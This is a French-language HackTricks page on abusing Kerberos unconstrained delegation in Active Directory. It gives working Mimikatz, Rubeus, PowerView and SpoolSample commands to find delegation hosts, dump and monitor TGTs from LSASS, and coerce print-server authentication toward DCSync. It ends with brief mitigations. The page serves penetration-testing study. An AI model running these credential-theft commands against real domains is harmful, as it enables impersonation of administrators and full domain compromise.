# Délégation sans contrainte

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Travaillez-vous dans une **entreprise de cybersécurité**? Vous souhaitez voir votre **entreprise annoncée dans HackTricks**? ou souhaitez-vous avoir accès à la **dernière version du PEASS ou télécharger HackTricks en PDF**? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au [dépôt hacktricks](https://github.com/carlospolop/hacktricks) et [dépôt hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Délégation sans contrainte

Il s'agit d'une fonctionnalité qu'un administrateur de domaine peut définir pour n'importe quel **ordinateur** à l'intérieur du domaine. Ensuite, chaque fois qu'un **utilisateur se connecte** à l'ordinateur, une **copie du TGT** de cet utilisateur va être **envoyée à l'intérieur du TGS** fourni par le DC **et sauvegardée en mémoire dans LSASS**. Ainsi, si vous avez des privilèges d'administrateur sur la machine, vous pourrez **extraire les tickets et vous faire passer pour les utilisateurs** sur n'importe quelle machine.

Donc, si un administrateur de domaine se connecte à un ordinateur avec la fonctionnalité de "Délégation sans contrainte" activée, et que vous avez des privilèges d'administrateur local sur cette machine, vous pourrez extraire le ticket et vous faire passer pour l'administrateur de domaine n'importe où (élévation de privilèges de domaine).

Vous pouvez **trouver des objets d'ordinateur avec cet attribut** en vérifiant si l'attribut [userAccountControl](https://msdn.microsoft.com/en-us/library/ms680832\(v=vs.85\).aspx) contient [ADS\_UF\_TRUSTED\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx). Vous pouvez le faire avec un filtre LDAP de ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, c'est ce que fait powerview :

<pre class="language-bash"><code class="lang-bash"># Liste des ordinateurs sans contrainte
## Powerview
Get-NetComputer -Unconstrained #Les DC apparaissent toujours mais ne sont pas utiles pour l'élévation de privilèges
<strong>## ADSearch
</strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
<strong># Exporter les tickets avec Mimikatz
</strong>privilege::debug
sekurlsa::tickets /export #Méthode recommandée
kerberos::list /export #Autre méthode

# Surveiller les connexions et exporter de nouveaux tickets
.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #Vérifier toutes les 10 secondes les nouveaux TGTs</code></pre>

Chargez le ticket de l'administrateur (ou de l'utilisateur victime) en mémoire avec **Mimikatz** ou **Rubeus pour un** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Plus d'informations : [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Plus d'informations sur la délégation sans contrainte sur ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Forcer l'authentification**

Si un attaquant est capable de **compromettre un ordinateur autorisé pour la "Délégation sans contrainte"**, il pourrait **tromper** un **serveur d'impression** pour **se connecter automatiquement** contre lui **enregistrant un TGT** dans la mémoire du serveur.\
Ensuite, l'attaquant pourrait effectuer une **attaque Pass the Ticket pour se faire passer pour** l'utilisateur du compte d'ordinateur du serveur d'impression.

Pour faire en sorte qu'un serveur d'impression se connecte à n'importe quelle machine, vous pouvez utiliser [**SpoolSample**](https://github.com/leechristensen/SpoolSample) :
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Si le TGT provient d'un contrôleur de domaine, vous pourriez effectuer une [**attaque DCSync**](acl-persistence-abuse/#dcsync) et obtenir tous les hachages du DC.\
[**Plus d'informations sur cette attaque sur ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

**Voici d'autres façons de tenter de forcer une authentification:**

{% content-ref url="printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](printers-spooler-service-abuse.md)
{% endcontent-ref %}

### Atténuation

* Limiter les connexions DA/Admin à des services spécifiques
* Définir "Le compte est sensible et ne peut pas être délégué" pour les comptes privilégiés.
